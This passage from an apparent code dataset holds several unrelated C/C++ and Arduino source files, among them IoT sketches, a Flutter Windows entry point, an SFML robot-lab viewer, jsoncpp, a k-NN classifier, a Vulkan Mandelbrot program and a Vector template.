new value (300) using the write API key\n    ThingSpeak.writeField(myChannelNumber, 8, 300, myWriteAPIKey); // Write the new value (300) to field 8\n    delay(500); // Delay to avoid rapid updates\n  }\n\n  // Another conditional behavior based on the value from field 8\n  if (D == 200) {\n    // If the value from field 8 is 200, trigger the D8 pin's actuator\n    digitalWrite(D8, HIGH); // Turn on pin D8\n    delay(500);             // Wait for 500 milliseconds\n    digitalWrite(D8, LOW);  // Turn off pin D8\n\n    // Update field 8 on ThingSpeak with a new value (300)\n    ThingSpeak.writeField(myChannelNumber, 8, 300, myWriteAPIKey); // Write the new value (300) to field 8\n    delay(500); // Delay to avoid rapid updates\n  }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"canvas_test_challenge\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <SFML/Graphics.hpp>\n#include <cmath>\n#include <iostream>\n#include <random>\n#include <vector>\n#include <chrono>\n\n// #include \"drawobjects.h\"\n#include \"utils.h\"\n\n// Text colours\nconst std::string RED = \"\\033[31m\";   // Red text\nconst std::string GREEN = \"\\033[32m\"; // Green text\nconst std::string RESET = \"\\033[0m\";  // Reset to default\n\nsf::RectangleShape draw_object(int x, int y, int width, int height) {\n    sf::RectangleShape obj(sf::Vector2f(width, height));\n    sf::Vector2f linePosition(x, y);\n    obj.setPosition(linePosition);\n    return obj;  \n}\n\n// draw\nvoid draw(\n    sf::RenderWindow &window,\n    sf::CircleShape &robot_draw,\n    sf::Vector2f &robotPosition,\n    std::vector<sf::RectangleShape> &objects_draw,\n    std::vector<std::vector<int>> &robot_pos,\n    sf::RectangleShape &goal_draw,\n    std::vector<sf::RectangleShape>::iterator &i,\n    bool &isPaused,\n    bool &succeed,\n    int &count\n) {\n    if (count < robot_pos.size() && robot_pos[count].size() >= 2) {\n        robotPosition.x = robot_pos[count][0]; // Safe access\n        robotPosition.y = robot_pos[count][1]; // Safe access\n    } else {\n        if (count < 200) {\n            std::cerr << \"Error: Accessing out of bounds for robot_pos at count: \" << count << std::endl;\n            // Handle error appropriately (e.g., skip iteration, set defaults, etc.)\n        }\n    }\n\n    // clear the window\n    window.clear();\n\n    // Drawing operations\n    robot_draw.setPosition(robotPosition);\n    window.draw(robot_draw);\n    window.draw(goal_draw);\n    // window.draw(line);\n    for (i = objects_draw.begin(); i != objects_draw.end(); ++i){\n        window.draw(*i);\n    }\n\n    if ((count >= robot_pos.size()-1) && succeed) {\n        std::cout << GREEN << \"Success! Goal reached!\" << RESET << std::endl;\n        window.close();\n    }\n    if ((count >= robot_pos.size()-1) && !succeed) {\n        std::cout << RED << \"Failure! Collision!\" << RESET << std::endl;\n        window.close();\n    }\n\n    // end the current frame\n    window.display();\n\n    // increment only if not paused\n    if (!isPaused) {\n        count++;\n    }    \n}\n\nvoid render_window(\n    std::vector<std::vector<int>> robot_pos,\n    std::vector<Object> objects, \n    Object robot, \n    Object goal, \n    int width, \n    int height,\n    bool succeed)\n{\n    int del_x, del_y, vel_x, vel_y;\n\n    //==========Setup==========\n\n    // get the screen size to center the window\n    int desktop_width = sf::VideoMode::getDesktopMode().width;\n    int desktop_height = sf::VideoMode::getDesktopMode().height;\n    int middle_x = (desktop_width/2) - width/2;\n    int middle_y = (desktop_height/2) - width/2;\n\n    // create the window\n    sf::RenderWindow window(sf::VideoMode(width, height), \"MTE301 Lab 2\");\n    window.setFramerateLimit(60);\n    window.setPosition(sf::Vector2i(middle_x, middle_y));\n\n    // create the robot\n    sf::CircleShape robot_draw(robot.width/2);\n    robot_draw.setFillColor(sf::Color::Blue);\n    sf::Vector2f robotPosition(robot.x, robot.y);\n    robot_draw.setPosition(robotPosition);\n\n    sf::RectangleShape goal_draw(sf::Vector2f(goal.width, goal.height));\n    sf::Vector2f goalPosition(goal.x, goal.y);\n    \n    goal_draw.setPosition(goalPosition);\n    goal_draw.setFillColor(sf::Color::Green);    \n\n    std::vector<sf::RectangleShape> objects_draw;\n    // Now spawn the objects in SFML. \n    for (int i = 0; i < objects.size(); i++) {\n        objects_draw.push_back(draw_object(objects[i].x, objects[i].y, objects[i].width, objects[i].height));\n    }\n\n    std::vector<sf::RectangleShape>::iterator i;\n    int count = 0;\n    bool isPaused{false}; // State to track whether the game is paused\n    int left_count{0}; // counter for how many times left was pressed\n    int right_count{0}; // counter for how many times right was pressed\n\n    // timers for button press events\n    auto prev_pause = std::chrono::steady_clock::now();\n    auto elapsed_pause = std::chrono::duration_cast<std::chrono::milliseconds>\n        (std::chrono::steady_clock::now() - prev_pause).count();\n    auto prev_left = std::chrono::steady_clock::now();\n    auto elapsed_left = std::chrono::duration_cast<std::chrono::milliseconds>\n        (std::chrono::steady_clock::now() - prev_left).count();\n    auto prev_right = std::chrono::steady_clock::now();\n    auto elapsed_right = std::chrono::duration_cast<std::chrono::milliseconds>\n        (std::chrono::steady_clock::now() - prev_right).count();\n\n    //==========Main loop==========\n    while (window.isOpen())\n    {\n\n        // check all the window's events that were triggered since the last iteration of the loop\n        sf::Event event;\n        while (window.pollEvent(event))\n        {\n            // \"close requested\" event: we close the window\n            if(event.type == sf::Event::Closed){\n                window.close();\n            }\n        }\n\n        // check for pausing. press p to pause\n        if (sf::Keyboard::isKeyPressed(sf::Keyboard::P)) {\n            elapsed_pause = std::chrono::duratio",
    "/// Json-cpp amalgamated source (https://github.com/open-source-parsers/jsoncpp/).\n/// It is intended to be used with #include \"json/json.h\"\n\n// //////////////////////////////////////////////////////////////////////\n// Beginning of content of file: LICENSE\n// //////////////////////////////////////////////////////////////////////\n\n/*\nThe JsonCpp library's source code, including accompanying documentation,\ntests and demonstration applications, are licensed under the following\nconditions...\n\nBaptiste Lepilleur and The JsonCpp Authors explicitly disclaim copyright in all\njurisdictions which recognize such a disclaimer. In such jurisdictions,\nthis software is released into the Public Domain.\n\nIn jurisdictions which do not recognize Public Domain property (e.g. Germany as of\n2010), this software is Copyright (c) 2007-2010 by Baptiste Lepilleur and\nThe JsonCpp Authors, and is released under the terms of the MIT License (see below).\n\nIn jurisdictions which recognize Public Domain property, the user of this\nsoftware may choose to accept it either as 1) Public Domain, 2) under the\nconditions of the MIT License (see below), or 3) under the terms of dual\nPublic Domain/MIT License conditions described here, as they choose.\n\nThe MIT License is about as close to Public Domain as a license can get, and is\ndescribed in clear, concise terms at:\n\n   http://en.wikipedia.org/wiki/MIT_License\n\nThe full text of the MIT License follows:\n\n========================================================================\nCopyright (c) 2007-2010 Baptiste Lepilleur and The JsonCpp Authors\n\nPermission is hereby granted, free of charge, to any person\nobtaining a copy of this software and associated documentation\nfiles (the \"Software\"), to deal in the Software without\nrestriction, including without limitation the rights to use, copy,\nmodify, merge, publish, distribute, sublicense, and/or sell copies\nof the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be\nincluded in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\nEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\nNONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\nBE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\nACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\nCONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n========================================================================\n(END LICENSE TEXT)\n\nThe MIT license is compatible with both the GPL and commercial\nsoftware, affording one all of the rights of Public Domain with the\nminor nuisance of being required to keep the above copyright notice\nand license text in the source code. Note also that by accepting the\nPublic Domain \"license\" you can re-license your copy using whatever\nlicense you like.\n\n*/\n\n// //////////////////////////////////////////////////////////////////////\n// End of content of file: LICENSE\n// //////////////////////////////////////////////////////////////////////\n\n\n\n\n\n\n#include <json/json.h>\n\n#ifndef JSON_IS_AMALGAMATION\n#error \"Compile with -I PATH_TO_JSON_DIRECTORY\"\n#endif\n\n\n// //////////////////////////////////////////////////////////////////////\n// Beginning of content of file: src/lib_json/json_tool.h\n// //////////////////////////////////////////////////////////////////////\n\n// Copyright 2007-2010 Baptiste Lepilleur and The JsonCpp Authors\n// Distributed under MIT license, or public domain if desired and\n// recognized in your jurisdiction.\n// See file LICENSE for detail or copy at http://jsoncpp.sourceforge.net/LICENSE\n\n#ifndef LIB_JSONCPP_JSON_TOOL_H_INCLUDED\n#define LIB_JSONCPP_JSON_TOOL_H_INCLUDED\n\n#if !defined(JSON_IS_AMALGAMATION)\n#include <json/config.h>\n#endif\n\n// Also support old flag NO_LOCALE_SUPPORT\n#ifdef NO_LOCALE_SUPPORT\n#define JSONCPP_NO_LOCALE_SUPPORT\n#endif\n\n#ifndef JSONCPP_NO_LOCALE_SUPPORT\n#include <clocale>\n#endif\n\n/* This header provides common string manipulation support, such as UTF-8,\n * portable conversion from/to string...\n *\n * It is an internal header that must not be exposed.\n */\n\nnamespace Json {\nstatic inline char getDecimalPoint() {\n#ifdef JSONCPP_NO_LOCALE_SUPPORT\n  return '\\0';\n#else\n  struct lconv* lc = localeconv();\n  return lc ? *(lc->decimal_point) : '\\0';\n#endif\n}\n\n/// Converts a unicode code-point to UTF-8.\nstatic inline String codePointToUTF8(unsigned int cp) {\n  String result;\n\n  // based on description from http://en.wikipedia.org/wiki/UTF-8\n\n  if (cp <= 0x7f) {\n    result.resize(1);\n    result[0] = static_cast<char>(cp);\n  } else if (cp <= 0x7FF) {\n    result.resize(2);\n    result[1] = static_cast<char>(0x80 | (0x3f & cp));\n    result[0] = static_cast<char>(0xC0 | (0x1f & (cp >> 6)));\n  } else if (cp <= 0xFFFF) {\n    result.resize(3);\n    resu",
    "// a task manager that can add new tasks and delete the least frequent ones\n#include<bits/stdc++.h>\nusing namespace std;\n\nclass TaskManager{\n  private:\n    unordered_map<string,int> taskFreq;\n    list<string> taskList;\n    unordered_map<string,list<string>::iterator> taskPos;\n  public:\n    void addTask(const string& task){\n      if(taskFreq.find(task)==taskFreq.end()){\n        taskList.push_back(task);\n        taskPos[task] = --taskList.end();\n        taskFreq[task] = 1;\n      }else{\n        taskFreq[task]++;\n      }\n    }\n\n    void removeLeastFrequent(){\n      if(taskList.empty()){\n        cout<<\"No tasks to remove\";\n        return;\n      }\n      string leastFreqTask = taskList.front();\n      taskList.pop_front();\n      cout<<\"Removing least frequent task\";\n      taskFreq.erase(leastFreqTask);\n      taskPos.erase(leastFreqTask);\n    }\n\n    void displayTasks() const{\n      cout<<\"Tasks in order: \"<<endl;\n      for(const auto& task: taskList){\n        cout<<task<<\" frequency: \"<<taskFreq.at(task)<<\")\"<<endl;\n      }\n    }\n};\n\nint main(){\n  TaskManager taskmanager;\n  taskmanager.addTask(\"Task1\");\n  taskmanager.addTask(\"Task2\");\n  taskmanager.addTask(\"Task1\");\n  taskmanager.addTask(\"Task3\");\n\n  return 0;\n}",
    "#include<iostream>\n#include<cstdlib>\n#include<vector>\n#include<fstream>\n#include<sstream>\n#include<string>\n#include<cmath>\n#include<algorithm>\nusing namespace std;\n\nstruct data_set{\n\tint pregnancies;//\u61f7\u5b55\u4e86\u5e7e\u6b21\n\tdouble glucose;//\u8840\u6db2\u4e2d\u8461\u8404\u7cd6\u6fc3\u5ea6\n\tdouble blood_pressure;//\u8212\u5f35\u58d3\n\tdouble skin_thickness;//\u4e09\u982d\u808c\u76ae\u647a\u539a\u5ea6\n\tdouble insulin;//\u80f0\u5cf6\u7d20\u6fc3\u5ea6\n\tdouble BMI;//BMI\n\tdouble diabetes_function;//\u7cd6\u5c3f\u75c5\u51fd\u6578\uff0c\u9019\u500b\u51fd\u6578\u4f7f\u7528\u4e86\u5bb6\u65cf\u7cd6\u5c3f\u75c5\u53f2\u4f86\u5c0e\u51fa\u500b\u4eba\u5f97\u7cd6\u5c3f\u75c5\u7684\u98a8\u96aa\u503c\n\tint age;\n\tint outcome;//0 \u7121\u7cd6\u5c3f\u75c5\uff0c1 \u6709\u7cd6\u5c3f\u75c5\n};\n\ndouble f1(data_set set1,data_set set2);\ndouble f2(data_set set1,data_set set2);\ndouble f3(data_set set1,data_set set2);\nbool cmp(pair<double,int> a,pair<double,int> b);\n\nint main()\n{\n\tfstream file;\n\tvector<data_set> train_data;\n\tvector<pair<double,int> > distance;\n\t//-----------------------read file and store data in struct-----------------------------\n\tfile.open(\"train_data.csv\",ios::in);\n\tstring line;\n\tdata_set data;\n\tgetline(file,line);//don't want the titles\n\twhile(getline(file,line,'\\n'))//read train_data.csv file\n\t{\n\t\tistringstream tmp_line(line);\n\t\tstring str;\n\t\twhile(getline(tmp_line,str,','))\n\t\t{\n\t\t\tdata.pregnancies = atoi(str.c_str());//convert string to int and store\n\n\t\t\tif(getline(tmp_line,str,','))\n\t\t\t\tdata.glucose = atof(str.c_str());//convert string to double and store\n\n\t\t\tif(getline(tmp_line,str,','))\n\t\t\t\tdata.blood_pressure = atof(str.c_str());\n\n\t\t\tif(getline(tmp_line,str,','))\n\t\t\t\tdata.skin_thickness = atof(str.c_str());\n\n\t\t\tif(getline(tmp_line,str,','))\n\t\t\t\tdata.insulin = atof(str.c_str());\n\n\t\t\tif(getline(tmp_line,str,','))\n\t\t\t\tdata.BMI = atof(str.c_str());\n\n\t\t\tif(getline(tmp_line,str,','))\n\t\t\t\tdata.diabetes_function = atof(str.c_str());\n\n\t\t\tif(getline(tmp_line,str,','))\n\t\t\t\tdata.age = atoi(str.c_str());\n\n\t\t\tif(getline(tmp_line,str,','))\n\t\t\t\tdata.outcome = atoi(str.c_str());\n\t\t}\n\t\ttrain_data.push_back(data);\n\t}\n\tfile.close();\n\t//for(int i = 0;i < train_data.size();i++)\n\t\t//cout<<train_data[i].pregnancies<<\" \";\n\t\n\t//------------------------------calculate distance and sort it---------------------------\n\t\n\tpair<double,int> tmp_pair;\n\t//for(int i = 0;i < train_data.size();i++)\n\t//{\n\t\tfor(int i = 1;i < train_data.size();i++)\n\t\t{\n\t\t\ttmp_pair = make_pair(f1(train_data[0],train_data[i]),train_data[i].outcome);\n\t\t\tdistance.push_back(tmp_pair);\n\t\t}\n\t//}\n\n\t\n\tsort(distance.begin(), distance.end(), cmp);\t\n\t//for(int i = 0;i < distance.size();i++)\n\t\t//cout<<distance[i].first<<\" \"<<distance[i].second<<endl;\n\n\t//-----------------------------finding best k value-------------------------------------\n\tint k;\n\tcout<<\"enter k value : \";\n\tcin>>k;\n\tint one = 0,zero = 0;\n\tfor(int i = 0;i < k;i++)\n\t{\n\t\tif(distance[i].second == 1)\n\t\t\tone++;\n\t\telse\n\t\t\tzero++;\n\t}\n\tif(one > zero)\n\t{\n\t\tcout<<\"Outcome = 1\"<<endl;\n\t\tif(train_data[0].outcome == 1)\n\t\t\tcout<<\"Prediction success\"<<endl;\n\t\telse\n\t\t\tcout<<\"Prediction fail\"<<endl;\n\t}\n\telse\n\t{\n\t\tcout<<\"Outcome = 0\"<<endl;\n\t\tif(train_data[0].outcome == 0)\n\t\t\tcout<<\"Prediction success\"<<endl;\n\t\telse\n\t\t\tcout<<\"Prediction fail\"<<endl;\n\t}\n}\n\nbool cmp(pair<double,int> a,pair<double,int> b)\n{\n\treturn a.first < b.first;\n}\n\ndouble f1(data_set set1,data_set set2)//Euclidean distance\n{\n\tdouble dis = 0;\n\tdis += pow(set1.pregnancies - set2.pregnancies,2);\n\tdis += pow(set1.glucose - set2.glucose,2);\n\tdis += pow(set1.blood_pressure - set2.blood_pressure,2);\n\tdis += pow(set1.skin_thickness - set2.skin_thickness,2);\n\tdis += pow(set1.insulin - set2.insulin,2);\n\tdis += pow(set1.BMI - set2.BMI,2);\n\tdis += pow(set1.diabetes_function - set2.diabetes_function,2);\n\tdis += pow(set1.age - set2.age,2);\n\treturn sqrt(dis);\n}\n\ndouble f2(data_set set1,data_set set2)//Manhattan distance\n{\n\treturn pow(f1(data_set set1,data_set set2),2);\n}\n\ndouble f3(data_set set1,data_set set2)//Minkowski distance\n{\n\tdouble dis = 0;\n\tdis += pow(set1.pregnancies - set2.pregnancies,8);\n\tdis += pow(set1.glucose - set2.glucose,8);\n\tdis += pow(set1.blood_pressure - set2.blood_pressure,8);\n\tdis += pow(set1.skin_thickness - set2.skin_thickness,8);\n\tdis += pow(set1.insulin - set2.insulin,8);\n\tdis += pow(set1.BMI - set2.BMI,8);\n\tdis += pow(set1.diabetes_function - set2.diabetes_function,8);\n\tdis += pow(set1.age - set2.age,8);\n\treturn pow(dis,0.125);\n}\n\n",
    "#include <stdio.h>\r\n#include <time.h>\r\n#include <graphics.h>\r\n\r\nvoid botao(int x1, int y1, int x2, int y2, char rotulo[15], int estado);\r\n\r\nmain()\r\n{\r\n      initwindow(210,200,\"Exerc\u00edcio\",100,100);\r\n\r\n      botao(50,50,160,80,\"Mensagem 1\",0);\r\n      botao(50,100,160,130,\"Mensagem 2\",0);\r\n\r\n      while(!kbhit())\r\n      {\r\n         if (mousex() >= 50 && mousex() <= 160 && mousey() >= 50 && mousey() <= 80 && ismouseclick(WM_LBUTTONDOWN))\r\n         {\r\n             botao(50,50,160,80,\"Mensagem 1\",1);\r\n             delay(200);\r\n             botao(50,50,160,80,\"Mensagem 1\",0);\r\n             printf(\"Mensagem 1: Estudar para Progredir!\\n\");\r\n         }\r\n\r\n         if (mousex() >= 50 && mousex() <= 160 && mousey() >= 100 && mousey() <= 130 && ismouseclick(WM_LBUTTONDOWN))\r\n         {\r\n             botao(50,100,160,130,\"Mensagem 2\",1);\r\n             delay(200);\r\n             botao(50,100,160,130,\"Mensagem 2\",0);\r\n             printf(\"Mensagem 2: Progredir para Transformar o Mundo!\\n\");\r\n         }\r\n\r\n         clearmouseclick(WM_LBUTTONDOWN);\r\n      }\r\n\r\n      // fecha o modo gr\u00e1fico e retorna ao modo de sa\u00edda-padr\u00e3o (texto)\r\n      closegraph();\r\n}\r\n\r\nvoid botao(int x1, int y1, int x2, int y2, char rotulo[15], int estado)\r\n{\r\n    if (estado == 0) // botao sem pressionamento\r\n    {\r\n        // area interior do botao\r\n        setfillstyle(1,7);\r\n        bar(x1,y1,x2,y2);\r\n\r\n        // linhas de contorno\r\n        setlinestyle(0,0,2);\r\n        setcolor(15);\r\n        line(x1,y1,x2,y1);\r\n        line(x1,y1,x1,y2);\r\n        setcolor(8);\r\n        line(x2,y1+2,x2,y2);\r\n        line(x1+2,y2,x2,y2);\r\n\r\n        // rotulo do botao\r\n        setbkcolor(7);\r\n        setcolor(0);\r\n        outtextxy(x1 + ((x2-x1-(strlen(rotulo)*8))/2) + 2, y1+8, rotulo);\r\n    }\r\n    else\r\n    {\r\n        if (estado == 1)\r\n        {\r\n            // area interior do botao\r\n            setfillstyle(1,7);\r\n            bar(x1,y1,x2,y2);\r\n\r\n            // linhas de contorno\r\n            setlinestyle(0,0,2);\r\n            setcolor(8);\r\n            line(x1,y1,x2,y1);\r\n            line(x1,y1,x1,y2);\r\n            setcolor(15);\r\n            line(x2,y1+2,x2,y2);\r\n            line(x1+2,y2,x2,y2);\r\n\r\n            // rotulo do botao\r\n            setbkcolor(7);\r\n            setcolor(0);\r\n            outtextxy(x1 + ((x2-x1-(strlen(rotulo)*8))/2) + 2, y1+9, rotulo);\r\n        }\r\n    }\r\n}\r\n",
    "//\n//                           M a n d e l  -  m a i n . c p p    ( Vulkan )\n//\n//  This is the main routine for the Mandelbrot program designed to demonstrate use of\n//  a GPU for computation and also for display of the results. This code should run\n//  under MacOS, Linux and as part of a Windows console app. It sets up the basic structure\n//  of the program: a window set up by the GLFW library, and a MandelController that\n//  handles the overall running of the program. The MandelController works with a\n//  compute handler that creates the Mandelbrot images and a renderer that displays them.\n//  This is more or less a standard Model-View-Controller arrangement. Since both the\n//  renderer and the compute handler make use of Vulkan for GPU interaction, the window\n//  set up by GLFW has to support Vulkan. Getting this set up is a touch intricate, and\n//  requires some interaction between GLFW and the Vulkan basic framework used by both\n//  renderer and compute handler, which messes a bit with the neat structure of the \n//  program. This main code handles that setup, then arranges the necessary callbacks\n//  between the GLFW window and the controller, and then lets the program run. After that,\n//  user interaction with the window will trigger the creation of new images by the\n//  compute handler and their display by the renderer.\n//\n//  Running:\n//      ./Mandel <Nx> <Ny> <Iter> <Validate> <Debug>\n//\n//  where:\n//      Nx        (integer) is the initial size of the calculated image in X. Default 1024.\n//      Ny        (integer) is the initial size of the calculated image in Y. Default 1024.\n//      Iter      (boolean) is the maximum number of iterations for the calculation. Default 1024.\n//      Validate  (boolean) is true if the Vulcan validation layers are to be enabled. Default true.\n//      Debug     (string) is a comma-separated list of hierarchical debugging options. Default \"\".\n//\n//  History:\n//       8th Nov 2024. Initial version for MacOS.\n//      23rd Feb 2024. Minor changes to get a clean compilation under Windows. KS.\n//      26th Feb 2024. As part of a general tidying of the Metal and Vulkan versions, the\n//                     MandelController constructor calling sequence has been changed. KS.\n//      11th Mar 2024. Now the basic framework supports it, call to EnableValidation() added. KS.\n//       7th Jun 2024. Renamed TheFramework to TheGraphicsFramework to make things clearer. Now\n//                     supports the use of a DebugHandler by the Vulkan framework. KS.\n//      27th Aug 2024. Significant reworking around changes to command handler code, supporting\n//                     Nx,Ny,Iter and Validate parrameters properly, allowing for exit requests\n//                     and adding use of a helper class for the Debug parameter. KS.\n//       5th Sep 2024. Split MouseCallback() into the two routines MouseButtonCallback() and\n//                     MouseMovedCallback(). KS.\n//      14th Sep 2024. Modified following renaming of Framework routines and types. KS.\n//      29th Sep 2024. Now ignores key presses outside the 'ordinary' character range. KS.\n\n#include \"WindowHandler.h\"\n#include \"MandelController.h\"\n#include \"CommandHandler.h\"\n\n#include <string>\n\n//  ------------------------------------------------------------------------------------------------\n//\n//                                  A p p  C o n t a c t\n//\n//  The Controller that coordinates the Renderer (which handles the display) and the Compute\n//  Handler (which calculates the images) defines a MandelAppContact class that it can use to\n//  communicate with the main Application code (in practice, this means with the Window Handler).\n//  At the moment, all we support is allowing the Controller to supply a string to be displayed\n//  in the window's title bar.\n\nclass AppContact : public MandelAppContact\n{\npublic:\n    //  Constructor - initialises variables.\n    AppContact() {\n        _window = nullptr;\n    }\n    //  Destructor - has nothing to do.\n    ~AppContact() {}\n    //  Called by the Controller to set the window title string.\n    void DisplayString (const char* Title) {\n        if (_window) _window->SetTitle(Title);\n    }\n    //  Called as part of setup to supply the address of the Window Handler.\n    void SetWindowHandler(WindowHandler* window)\n    {\n        _window = window;\n    }\nprivate:\n    //  The address of the WindowHandler.\n    WindowHandler* _window;\n};\n\n//  ------------------------------------------------------------------------------------------------\n//\n//                       W i n d o w  H a n d l e r  C a l l b a c k s\n//\n//  These routines are called by the Window Handler in response to events such as a key press\n//  or a mouse click, or when the window contents need to be redisplayed. Their addresses are\n//  passed to the WindowHandler as part of the setup, together with the address of the Controller,\n//  which is passed to these routines as the value of the UserData parameter.\n\nvoid DrawCallback(void* U",
    "#include \"Arduino.h\"\n#include \"Speed_Radar.h\"\nSpeed_Radar::Speed_Radar(int sensitivity, int read_speed, int distance, int conversion_factor){\n\tpinMode(A0, INPUT);\n\tpinMode(A1, INPUT);\n\tSerial.begin(9600);\n\n\t// sensor diffrence detection\n\tthis->sensor_curr_0 = 0;\n\tthis->sensor_curr_1 = 0;\n\tthis->sensor_value_0 = 0;\n\tthis->sensor_value_1 = 0;\n\t//time markers\n\tthis->end_time = 0;\n\tthis->start_time = 0;\n\tthis->time_elapsed= 0;\n\t// calibration settings\n\tthis->sensitivity = sensitivity; // inverted   \n\tthis->read_speed = read_speed; // inverted\n\tthis->distance = distance; \n\tthis->conversion_factor = conversion_factor; //1000 is from microsec to sec 10^-6\n\t// output \n\tthis->speed = 0; // can be set to unsigned int \n}\n\nvoid Speed_Radar::Detect_Speed(){\n\tsensor_value_0 = analogRead(A0);\n  \tdelay(read_speed);\n  \tsensor_curr_0 = analogRead(A0);\n\n  \tif(sensor_value_0 > (sensor_curr_0 + sensitivity)){ \n    \tstart_time = micros();\n    \tsensor_value_1 = analogRead(A1);\n    \tdelay(read_speed);\n    \tsensor_curr_1 = analogRead(A1);\n    \twhile (!(sensor_value_1 > (sensor_curr_1 + sensitivity))) {\n      \t\tsensor_value_1 = analogRead(A1);\n      \t\tdelay(read_speed);\n      \t\tsensor_curr_1 = analogRead(A1);\n      \t\tSerial.println(\"waiting for detection\");\n      \t}\n      \tend_time = micros();\n\t    time_elapsed = end_time - start_time;\n\t    speed = time_elapsed/(distance*conversion_factor);\n\t    Print_Result();\n    }\n\n}\n\n\nvoid Speed_Radar::Print_Result(){\n    Serial.print(\"Time elapsed is: \");\n    Serial.print(time_elapsed);\n    Serial.println(\" microseconds\");\n    speed = time_elapsed/(distance*conversion_factor);\n    Serial.print(\"Speed is: \");\n    Serial.print(speed);\n    Serial.println(\" cm/s\"); \n}",
    "#include<stdexcept>\n#include<algorithm>\n#include<iostream>\ntemplate<typename T>\nclass Vector{\nprivate:\n\n    T* elements;                                //A pointer point to first element of Vector\n\n    size_t capacity;                            //Maximum quantity of elements that can be contained by current Vector\n\n    size_t size;                                //Current quantity of elements in Vector, size <= capacity\n\n    void reserve(size_t newCapacity)            //Change capacity, usually larger \n    {\n        if(newCapacity == capacity)             //Do nothing\n        {\n            return;\n        }\n\n        T* newElements = new T[newCapacity];    //Allocate a new place, then copy elements to new place in codes below\n\n        if(newCapacity >= size)                 //All of current elements can be copy to new place\n        {\n            std::copy(elements, elements + size, newElements);\n            delete [] elements;\n            elements = newElements;\n            capacity = newCapacity;\n        }\n\n        else                                    //Remove some elements due to smaller capacity \n        {\n            std::copy(elements, elements + newCapacity, newElements);\n            delete [] elements;\n            elements = newElements;\n            capacity = newCapacity;\n            size = newCapacity;\n        }\n        \n    }\n\npublic:\n\n    Vector() : elements(nullptr), capacity(0), size(0){}\n\n    ~Vector()\n    {\n        delete[] elements;\n    }\n\n    Vector(const Vector& other) : capacity(other.capacity), size(other.size)\n    {\n        elements = new T[capacity];\n        std::copy(other.elements, other.elements + size, elements);\n    }\n\n    Vector& operator = (const Vector& other)      //Copy\n    {\n        if(this != &other)\n        {\n            delete[] elements;\n            capacity = other.capacity;\n            size = other.size;\n            elements = new T[capacity];\n            std::copy(other.elements, other.elements + size, elements);\n        }\n\n        return *this;\n    }\n\n    T& operator[](size_t index)                     //Visit elements by index\n    {\n        if(index >= size)\n        {\n            throw std::out_of_range(\"Index out of range\");\n        }\n\n        return elements[index];\n    }\n\n    const T& operator[](size_t index) const         //Maybe user need a const type return value, provide a const version\n    {\n        if(index >= size)\n        {\n            throw std::out_of_range(\"Index out of range\");\n        }\n\n        return elements[index];\n    }\n\n    size_t getSize() const\n    {\n        return size;\n    }\n\n    size_t getCapacity() const\n    {\n        return capacity;\n    }\n\n    T* begin()                                      //Visit elements by pointer(iterator)\n    {\n        return elements;\n    }\n\n    T* end()                                        //The pointer point to the place behind last element of current Vector\n    {\n        return elements + size;\n    }\n\n    const T* begin() const\n    {\n        return elements;\n    }\n\n    const T* end() const\n    {\n        return elements + size;\n    }\n\n    void push_back(const T &val)                    //Notice: when size is equal to capacity we need to increase the capacity\n    {\n        if(size == capacity) \n        {\n            reserve(capacity == 0 ? 1 : 2 * capacity);\n        }\n\n        elements[size++] = val;\n    }\n\n    void pop_back()                                 //Notice the bound\n    {\n        if(size-- == 0)\n        {\n            throw std::out_of_range(\"Vector is empty\");\n        }\n    }\n\n    const T& back()                                 //Notice the bound\n    {\n        if(size == 0)\n        {\n            throw std::out_of_range(\"Vector is empty\");\n        }\n\n        return elements[size - 1];\n    }\n\n    void insert(const T& val, size_t index)         //Notice: 1.when the index is out of range; 2.when the capacity need to increase\n    {\n        if(index > size)\n        {\n            throw std::out_of_range(\"Index out of range\");\n        }\n\n        if(index == capacity || size == capacity)\n        {\n            reserve(capacity == 0 ? 1 : 2 * capacity);\n        }\n\n        for(size_t idx = size; idx > index; idx--)\n        {\n            elements[idx] = elements[idx - 1];\n        }\n\n        elements[index] = val;\n        ++size;\n    }\n\n    void erase(size_t index)\n    {\n        if(index >= size)\n        {\n            throw std::out_of_range(\"Index out of range\");\n        }\n\n        for(size_t idx = index; idx < size - 1; ++idx)\n        {\n            elements[idx] = elements[idx + 1];\n        }\n        \n        --size;\n    }\n\n    void resize(size_t newSize)                     //Notice: Sometimes capacity is not enough\n    {\n        if(newSize <= size)\n        {\n            size = newSize;\n        }\n        else\n        {\n            while(newSize > capacity)\n            {\n                reserve(capacity == 0 ? 1 : 2 * capacity);\n            }\n            \n            for(size_t idx = size; idx < newSize; ++ ",
